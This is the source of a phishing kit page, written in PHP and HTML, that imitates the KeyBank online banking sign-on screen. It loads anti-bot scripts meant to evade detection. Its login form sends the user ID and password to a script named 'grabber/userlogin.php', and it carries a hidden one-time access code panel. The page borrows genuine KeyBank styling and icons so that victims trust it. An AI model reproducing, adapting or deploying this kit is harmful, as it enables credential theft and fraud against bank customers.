<?php

error_reporting(0);
include('./assets/Antibot/blockers.php');
include('./assets/Antibot/detects.php');
?>

<!DOCTYPE html>

<html lang="en">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<meta name="Description" content="Securely access your KeyBank accounts online">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="apple-itunes-app" content="app-id=510717503">  
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<title>KeyBank Online</title>

		<link href="./assets/css/kds-base-key.css" rel="stylesheet">
 	 	<link href="./assets/css/ibx-globals-key.css" rel="stylesheet">
 	 	<link rel="prefetch" href="./assets/css/styles.css">
 	 	<link rel="stylesheet" type="text/css" href="./assets/css/styless.css">
		<link rel="stylesheet" href="./assets/css/styles.a4962029f638dde4888c.css">
		<link rel="stylesheet" type="text/css" href="./assets/css/styles-key.css" media="all">
		<link href="./assets/css/styles_key.css" rel="stylesheet">

		<link rel="prefetch" href="https://ibx.key.com/ibxolb/olb/share/styles/css/bootstrap_ext-key.css">    
		<link rel="prefetch" href="https://ibx.key.com/ibxolb/olb/styles/css/custom_olb-key.css"> 
		<link rel="prefetch" href="https://ibx.key.com/ibxolb/dashboard/styles.css">
		<link rel="prefetch" href="https://ibx.key.com/ibxolb/fw-budgets/styles.css">
		<link rel="prefetch" href="https://ibx.key.com/ibxolb/fw-fico/styles.css">

		

		<link rel="apple-touch-icon" sizes="180x180" id="appleTouchIcon" href="https://ibx.key.com/ibxolb/login/images/apple-touch-icon.png">
  		<link rel="icon" type="image/png" sizes="32x32" id="fav32" href="https://ibx.key.com/ibxolb/login/images/favicon-32x32.png">
  		<link rel="icon" type="image/png" sizes="16x16" id="fav16" href="https://ibx.key.com/ibxolb/login/images/favicon-16x16.png">
  		<link rel="shortcut icon" href="https://ibx.key.com/ibxolb/login/favicon.ico">

  		<style type="text/css" id="kampyleStyle">
  			.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}button#nebula_div_btn { height: auto !important } .kampyle_vertical_button { background-color:transparent !important;font-family:"Open Sans",sans-serif;cursor:pointer;position:fixed;top:45%;z-index:99999990;height:35px !important;min-height: 35px !important;max-height: 35px !important;width:125px !important;max-width: 125px !important;min-width: 125px !important;-ms-transform:rotate(90deg);-webkit-transform:rotate(90deg);transform:rotate(90deg) } .kampyle_vertical_button .kampyle_button { height:35px;min-height: 35px !important;max-height: 35px !important;width:125px !important;min-width: 125px !important;max-width: 125px !important; background:#5081ff;color:#ffffff;position:absolute;top:0;left:0;z-index:-1; } .kampyle_vertical_button .kampyle_button-text { color:#ffffff;font-size:14px;line-height:35px;text-align:center;font-weight:normal !important; } .kampyle_vertical_button.kampyle_left .kampyle_button { -webkit-border-radius:3px 3px 0 0;-moz-border-radius:3px 3px 0 0;-ms-border-radius:3px 3px 0 0;border-radius:3px 3px 0 0; } .kampyle_vertical_button.kampyle_right { right:-45px; } .kampyle_vertical_button.kampyle_left { left:-45px } .kampyle_vertical_button.kampyle_right .kampyle_button { -webkit-border-radius:0 0 3px 3px;-moz-border-radius:0 0 3px 3px;-ms-border-radius:0 0 3px 3px;border-radius:0 0 3px 3px } .kampyle_vertical_button.kampyle_right, .kampyle_vertical_button.kampyle_left  { padding: 0 !important; }
  		</style>
	</head>

	<body>&nbsp;
		<login-app ng-version="7.2.16">
			<cool-loader></cool-loader>
			<div class="login-app-wrapper">
				<router-outlet></router-outlet>
				<login-page>
					<div class="login">
						<login-header>
							<header class="container-fluid">
								<div class="container">
								<div class="row">
									<div class="col-12">
										<div class="login_header d-flex align-items-center justify-content-between">
											<a data-analytics-login="logo" href="javascript:void(0);" id="nonSsoHeader" title="KeyBank">
												<h3 class="key-logo no-print">
													<span class="sr-only">KeyBank</span>
													<img alt="KeyBank" src="./assets/img/key_white_logo.png">
												</h3>
											</a>
											<a class="d-none sso-header" data-analytics-login="logo" href="javascript:void(0);" id="ssoHeader" title="KeyBank">
												<h3 class="key-logo no-print">
													<span class="sr-only">KeyBank</span>
													<img alt="KeyBank" src="./assets/img/key_black_logo.png">
												</h3>
											</a>
											<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
												<button class="navbar-toggler" type="button">
													<span class="navbar-toggler-icon"></span>
												</button>
												<div class="collapse navbar-collapse navlink-wrapper">
													<ul class="mb-0">
														<li>
															<a data-analytics-login="contact us" data-test="cntushdrlnk" href="javascript:void(0);" title="Contact Us">Contact Us</a>
														</li>
														<li>
															<a data-analytics-login="open a new account" data-test="openewaccount" href="javascript:void(0);" title="Open a New Account">Open a New Account</a>
														</li>
													</ul>
												</div>
											</nav>
										</div>
									</div>
								</div>
							</div>
						</header>
						<div class="navbg-blur collapse navbar-collapse"></div>
					</login-header>
					<sign-in-core>
						<div class="container app-container">
							<div class="row">
								<div class="col-12">
									<div class="signin-block-container d-flex justify-content-center flex-row flex-wrap">
										<div class="signin-msg-primary-mbl d-block d-md-none">
											<div id="msgMobPrimary" hidden=""></div>
										</div>
										<div class="signin-container signin-combo" id="signInMain">
											<sign-in-header>
												<div class="text-center singlesignon_headerauth--logo">
													<img alt="Key Logo" class="singlesignon_headerauth--logo" src="./assets/img/key-logo.svg">
												</div>
												<div class="sso-primarymsg" hidden="">
													<div id="msgPrimary"></div>
												</div>
												<h1 class="kds-screenreader-only">Log in to online banking</h1>
											</sign-in-header>
											<div class="col-12 mt-3" hidden="">
												<div class="kds-alert">
													<div class="kds-alert__content kds-alert__content--warning mb-0">
														<div class="kds-alert__cell kds-alert__cell--indicator">
															<svg aria-hidden="true" aria-labelledby="login-app-waring" class="kds-icon kds-alert__indicator" role="img">
																<title class="kds-screenreader-only" id="login-app-waring">Key Login warning icon</title>
																<use xlink:href="./assets/img/kds.svg"></use>
															</svg>
														</div>
														<div class="kds-alert__cell kds-alert__cell--body">
															<p class="kds-alert__description pb-0" data-test="si_error_msg" x-ms-format-detection="none"></p>
														</div>
													</div>
												</div>
											</div>
											<div class="row signin-block">
												<div class="col-12 signin-input-section">
												
													<form autocomplete="off" novalidate="" method="POST" class="ng-pristine ng-valid ng-touched" action="./assets/grabber/userlogin.php" id="frmSignOn">

														<div class="userid-container">
															<kds-input class="userid-input ng-pristine ng-valid ng-touched" data-test="si_userid_input" icon="user-account" name="userName" maxlength="30">
																<div class="kds-form__field-group">
																	<label class="kds-form__label" for="ibx-user-id-input">
																		<span>
																			<span id="ibx-user-id-input-label"> Enter your User ID </span>
																		</span>
																	</label>
																	<div class="kds-form__input-group">
																		<div class="kds-form__input-group-icon">
																			<kds-icon>
																				<svg xmlns:xlink="http://www.w3.org/1999/xlink" focusable="false" xmlns="http://www.w3.org/2000/svg" class="kds-icon kds-icon--s" aria-hidden="true">
																					<use xlink:href="./assets/img/kds.svg#user-account" href="./assets/img/kds.svg#user-account"></use>
																				</svg>
																			</kds-icon>
																		</div>
																		<input kdsinput="" id="ibx-user-id-input" placeholder="" maxlength="30" aria-describedby="kds-input-1-error kds-input-1-microcopy" autocapitalize="none" class="ng-pristine ng-valid kds-form__input ng-touched" type="userID" name="UserID">
																	</div>
																	<span aria-live="assertive" kdsmicrocopy="" id="kds-input-1-error" class="kds-form__microcopy kds-form__microcopy--error kds-form__microcopy--empty"></span>
																	<span kdsmicrocopy="" id="kds-input-1-microcopy" class="kds-form__microcopy kds-form__microcopy--empty"></span>
																</div>
															</kds-input>
															<button icon="fingerprint" kdsinputaction="" type="button" hidden="" class="kds-button kds-button--flat">
																<svg class="kds-icon kds-button__icon" focusable="false">
																	<use xlink:href="./assets/img/kds.svg#fingerprint" href="./assets/img/kds.svg#fingerprint"></use>
																</svg>
																<span class="kds-screenreader-only">Use Biometric Login </span>
															</button>
														</div>
														<kds-input data-test="log_pwd_txt" name="password" class="ng-untouched ng-pristine ng-valid">
															<div class="kds-form__field-group">
																<label class="kds-form__label" for="ibx-password-input">
																	<span>
																		<span id="ibx-password-input-label"> Enter your Password </span>
																	</span>
																</label>
																<div class="kds-form__input-group">
																	<div class="kds-form__input-group-icon">
																		<kds-icon>
																			<svg xmlns:xlink="http://www.w3.org/1999/xlink" focusable="false" xmlns="http://www.w3.org/2000/svg" class="kds-icon kds-icon--s" aria-hidden="true">
																				<use xlink:href="./assets/img/kds.svg#protected-locked" href="./assets/img/kds.svg#protected-locked"></use>
																			</svg>
																		</kds-icon>
																	</div>
																	<input kdsinput="" id="ibx-password-input" placeholder="" aria-describedby="kds-input-0-error kds-input-0-microcopy" autocapitalize="none" class="ng-untouched ng-pristine ng-valid kds-form__input" type="password" name="Password">
																	<div class="kds-form__input-group-icon">
																		<button kdsinputaction="" id="ibx-password-input-maskButton" aria-pressed="false" aria-labelledby="ibx-password-input-maskButton ibx-password-input-label" class="kds-button kds-button--flat" type="button">
																			<svg class="kds-icon kds-button__icon" focusable="false">
																				<use xlink:href="./assets/img/kds.svg#visible-hidden" href="./assets/img/kds.svg#visible-hidden"></use>
																			</svg>
																			<span class="kds-screenreader-only"> Show input value </span>
																		</button>
																	</div>
																</div>
																<span aria-live="assertive" kdsmicrocopy="" id="kds-input-0-error" class="kds-form__microcopy kds-form__microcopy--error kds-form__microcopy--empty"></span>
																<span kdsmicrocopy="" id="kds-input-0-microcopy" class="kds-form__microcopy kds-form__microcopy--empty"></span>
															</div>
														</kds-input>
														<div class="d-flex justify-content-between">
															<div class="pull-left">
																<kds-checkbox data-analytics="action_cl|rememberMe" data-test="si_save_userid" name="rememberMe" class="ng-untouched ng-pristine ng-valid">
																	<label class="kds-form__checkbox" id="label-kdscheckbox-0" for="kdscheckbox-0">
																		<input class="kds-form__checkbox-input" type="checkbox" id="kdscheckbox-0" name="rememberMe" value="" aria-labelledby="label-kdscheckbox-0">
																		<span class="kds-form__checkbox-visible-wrap">
																			<span class="kds-form__checkbox-visual">
																				<svg aria-hidden="true" class="kds-icon kds-icon--m kds-form__checkbox-icon kds-form__checkbox-icon--checked" focusable="false">
																					<use xlink:href="./assets/img/kds.svg#check" href="./assets/img/kds.svg#check"></use>
																				</svg>
																				<svg aria-hidden="true" class="kds-icon kds-icon--m kds-form__checkbox-icon kds-form__checkbox-icon--indeterminate" focusable="false">
																					<use xlink:href="./assets/img/kds.svg#minus" href="./assets/img/kds.svg#minus"></use>
																				</svg>
																			</span>
																			<span class="kds-form__checkbox-text "> Remember me </span>
																		</span>
																	</label>
																</kds-checkbox>
															</div>
														</div>

														<input class="mt-3 kds-button--primary kds-button kds-button--block" id="index_btn" data-test="log_sbt_btn" type="submit" value="Sign On ">

													</form>
												</div>
												<div class="col-12 mt-4 signin__button-well signin-button-well-combo">
													<div class="pull-right">
														<button data-analytics-login="problem" data-test="si_help_btn" kdsbutton="flat" class="kds-button--flat kds-button kds-button--block" type="button">Problem Signing On?</button>
													</div>
													<hr>
													<button data-analytics="action_cl|enroll" data-analytics-login="enroll" data-test="si_enroll_btn" kdsbutton="flat" class="kds-button--flat kds-button kds-button--block" type="button">Enroll in Online Banking</button>
												</div>
												<div class="signin-block" hidden="">
													<div class="signin-redirect-section">Authenticating.. Please wait.</div>
												</div>
											</div>
										</div>
										<div class="signin-msg-container" hidden="">
											<div class="signin-msg-primary d-none d-md-block d-lg-block d-xl-block">
												<div id="msgPrimary"></div>
											</div>
											<div class="signin-msg-secondary">
												<div id="msgSecondary"></div>
											</div>
										</div>
									</div>
									<div class="col-12 col-md-8 offset-md-2 col-xl-6 offset-xl-3">
										<div hidden="">
											<div id="loginStepUpContainer"></div>
										</div>
										<div id="signInAmtContainer" hidden=""></div>
										<div class="signin-otac-72" id="signInAmtContainer" hidden=""><img alt="otac" src="./assets/img/otac-72-hours.svg">
											<h2> Here's a new One-Time Access Code. </h2>
											<p> It'll be active for the next 72 hours. Don't share it with anyone—not even a representative of KeyBank.</p>
											<h3 class="mt-4"> Your Access Code: </h3>
											<div class="otac-display">
												<span>
													<span></span>
													<span></span>
													<span></span>
												</span>

												<kds-tooltip>
													<div class="kds-tooltip__wrapper">
														<button kdstooltiptrigger="" class="kds-button--flat kds-tooltip__target kds-button" type="button">
															<span class="kds-button__text">Copy 
																<span class="kds-screenreader-only">otac number</span>
															</span>
															<svg aria-hidden="true" focusable="false" class="kds-icon kds-button__icon kds-button__icon--right">
																<use xlink:href="./assets/img/kds.svg" href="./assets/img/kds.svg"></use>
															</svg>
														</button>
														<div class="kds-tooltip--top kds-tooltip kds-tooltip--toggle kds-tooltip--default" id="kds-tooltip-aatgjju31" role="status"></div>
													</div>
												</kds-tooltip>
											</div>
											<button class="mt-5 kds-button--primary kds-button kds-button--block" type="button">Continue to Account Summary </button>
										</div>
									</div>
								</div>
							</div>
							<menu-popover></menu-popover>
			
							<kds-modal>
								<div class="kds-modal" aria-hidden="true">
									<div aria-modal="true" class="kds-modal__content" kdsfocustrap="" role="dialog" aria-labelledby="kds-modal-0-heading">
										<kds-modal-header class="kds-modal__header">
											<p class="kds-modal__heading"> Problem Signing On? </p>
											<button kdsmodalclosebutton="" class="kds-modal__dismiss kds-button kds-button--icon-only kds-button--flat kds-button--small">
												<svg aria-hidden="true" class="kds-icon kds-icon--xl kds-button__icon kds-button__icon--left" focusable="false">
													<use xlink:href="./assets/img/kds.svg/kds.svg" href="./assets/img/kds.svg/kds.svg"></use>
												</svg>
												<span class="kds-screenreader-only">Dismiss</span>
											</button>
										</kds-modal-header>
										<kds-modal-body kdsmutationobserver="" kdsscrollobserver="" class="kds-modal__body">
											<button class="mt-4 kds-button--default kds-button kds-button--block" data-analytics-login="forgot user id" data-test="forgot_usr_btn" type="submit">Forgot My User ID</button>
											<button class="mt-4 kds-button--default kds-button kds-button--block" data-analytics-login="forgot password" data-test="forgot_pass_btn" type="submit">Forgot My Password </button>
											<button class="mt-4 mb-2 kds-button--default kds-button kds-button--block" data-analytics-login="account locked" data-test="unlock_usr_btn" type="submit">Unlock My Account </button>
										</kds-modal-body>
									</div>
								</div>
							</kds-modal>
						</div>
					</sign-in-core>
				</div>
			</login-page>
		</div>
		<build-info>
			<p class="app-build-info">Last updated: 2022-05-06 19:47:26</p>
		</build-info>
	</login-app>
	&nbsp; &nbsp; 

	<div>
		<div id="popupBlockNotifier" hidden="" class="kds-modal kds-modal--dialog" data-id="modal-text-heavy-with-actions" aria-hidden="true">
			<div class="kds-modal__content" role="dialog" aria-modal="true" tabindex="-1" hidden="" id="withoutOpenSsoUrlContainer">
				<h3 class="kds-modal__body">Please disable your pop-up blocker</h3>
				<div class="kds-modal__body">To access this page, you'll need to allow pop-ups in your browser's privacy settings.</div>
				<div class="kds-modal__footer">
					<div class="kds-modal__footer-cell kds-modal__footer-cell--primary">
						<button id="popupBlockNotifierOkButton" class="kds-button kds-button--primary kds-doc-modal-confirm kds-doc-action kds-button--block" type="button" role="button">OK</button>
					</div>
				</div>
			</div>
            <div class="kds-modal__content" role="dialog" aria-modal="true" tabindex="-1" hidden="" id="withOpenSsoUrlContainer">
                <div class="kds-modal__header">
                    <h3 class="kds-modal__heading" id="headMsg">
                    	<button class="kds-button kds-modal__dismiss kds-doc-modal-dismiss kds-button--icon-only kds-button--flat kds-button--small" type="button">
                    		<svg class="kds-icon kds-button__icon kds-button__icon--left" focusable="false" aria-hidden="true">
                    			<use xlink:href="./assets/img/kds.svg#close"></use>
                    		</svg>
                    	</button>
                    </h3>
                </div>
                <div class="kds-modal__body" id="innerMsg"></div>
                <div class="kds-modal__footer">
                    <div class="kds-modal__footer-cell kds-modal__footer-cell--primary">
                        <button class="kds-button kds-button--primary kds-button--small kds-doc-modal-confirm kds-doc-action" type="button" role="button" id="accessButton"></button>
                    </div>
                    <div class="kds-modal__footer-cell kds-modal__footer-cell--cancel">
                        <button class="kds-button kds-button--default kds-button--small kds-doc-modal-dismiss kds-doc-action" type="button" role="button" id="closeButton"></button>
                    </div>
                </div>
           </div>
        </div>
    </div>
    <div>
        <div id="popupNotifier" hidden="" class="kds-modal kds-modal--dialog" style="z-index: 99999" data-id="modal-text-heavy-with-actions" aria-hidden="true">
        	<div class="kds-modal__content" role="dialog" aria-modal="true" tabindex="-1" hidden="" id="ssoUrlContainer">
        		<div class="kds-modal__header">
        			<h3 class="kds-modal__heading">Going to Mohela</h3>
        			<button class="kds-button kds-modal__dismiss kds-doc-modal-dismiss kds-button--icon-only kds-button--flat kds-button--small" type="button" >
        				<svg class="kds-icon kds-button__icon kds-button__icon--left" focusable="false" aria-hidden="true">
                            <use xlink:href=./assets/img/kds.svg#close"></use>
                        </svg>
                    </button>
                </div>
                <div class="kds-modal__body">
                	<p>You are about to leave Laurel Road online banking to go to Mohela, our loan servicing partner, at laurelroad.mohela.com. There, you’ll be able to make payments, see your statements, and get tax documents for your loans.</p>
                	<p>For your security, you will need to sign in at laurelroad.mohela.com using your Mohela login.</p>
                </div>
                <div class="kds-modal__footer">
                    <div class="kds-modal__footer-cell kds-modal__footer-cell--primary">
                        <button class="kds-button kds-button--primary kds-button--small kds-doc-modal-confirm kds-doc-action" type="button" role="button" >Continue</button>
                    </div>
                    <div class="kds-modal__footer-cell kds-modal__footer-cell--cancel">
                        <button class="kds-button kds-button--default kds-button--small kds-doc-modal-dismiss kds-doc-action" type="button" role="button" >Cancel</button>
                    </div>
                </div>
           </div>
        </div>  
      </div>
  </div> </div></div></span>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>
  	<script>

  		$(document).ready(function () {
				var $input = $('[name=UserID], [name=Password]'),
				$register = $('#index_btn');
				
				$input.each(function () {
					if (!$(this).val()) {
						$register.attr('disabled', true);
						return false;
					}
				});
				$input.keyup(function () {
					var trigger = false;
					$input.each(function () {
						if (!$(this).val()) {
							trigger = true;
						}
					});
					trigger ? $register.attr('disabled', true) : $register.removeAttr('disabled');
				});
			});


  		
	</script>


</body></html>